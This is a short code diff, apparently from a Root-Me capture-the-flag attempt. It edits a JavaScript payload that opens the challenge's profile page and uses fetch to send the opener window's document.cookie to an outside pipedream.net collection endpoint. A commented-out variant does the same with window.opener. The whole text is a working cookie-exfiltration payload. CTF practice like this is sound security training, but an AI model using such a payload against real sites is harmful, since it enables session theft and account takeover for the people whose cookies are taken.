@@ -7,7 +7,7 @@
 
 try{
 	var aaa = open('http://challenge01.root-me.org:58003/profile', 'target')
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + aaa.opener, {mode: 'no-cors'})
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + aaa.opener.document.cookie, {mode: 'no-cors'})
 	/*
 	window.opener.location.replace("http://challenge01.root-me.org:58003/profile");
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + window.opener, {mode: 'no-cors'})
